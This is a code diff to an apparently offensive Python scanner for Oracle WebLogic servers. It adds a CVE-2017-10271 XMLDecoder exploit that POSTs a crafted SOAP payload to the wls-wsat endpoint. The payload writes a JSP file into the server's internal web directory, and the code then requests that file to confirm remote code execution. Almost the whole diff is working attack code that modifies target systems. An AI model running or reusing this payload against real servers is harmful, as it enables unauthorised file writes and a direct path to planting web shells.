@@ -21,8 +21,38 @@ class Detect(threading.Thread):
         try:
             res = requests.get(url=weblogic_url, headers=self.headers, allow_redirects=False, timeout=10)
             if 'AsyncResponseService home page' in res.text:
-                cprint('[weblogic] {}'.format(url), 'red')
+                cprint('[CVE-2019-2719 {}'.format(url), 'red')
                 self.vul_list.append(['weblogic', url])
+            else:
+                print('[-] {}'.format(url))
+        except Exception as e:
+            pass
+
+    def CVE_2017_10271(self, url):
+        headers = {"Content-Type": "text/xml"}
+        exp = '''
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+        <java><java version="1.4.0" class="java.beans.XMLDecoder">
+            <object class="java.io.PrintWriter">
+                <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a1.jsp</string><void method="println">
+                    <string><![CDATA[111111111111111111111111111111111]]></string></void><void method="close"/>
+            </object>
+        </java>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+<soapenv:Body/>
+</soapenv:Envelope>
+        '''
+        try:
+            tgtURL = url + '/wls-wsat/CoordinatorPortType'
+            requests.post(tgtURL, data=exp, headers=headers, timeout=10)
+            jsp_path = url + '/bea_wls_internal/a1.jsp'
+            text = requests.get(jsp_path, headers=headers, timeout=10).text
+            if "111111111111111111111111111111111" in text:
+                cprint("[CVE-2017-10271] {} WebLogic WLS xmldecoder RCE ! path : {}".format(url, jsp_path), 'red')
             else:
                 print('[-] {}'.format(url))
         except Exception as e:
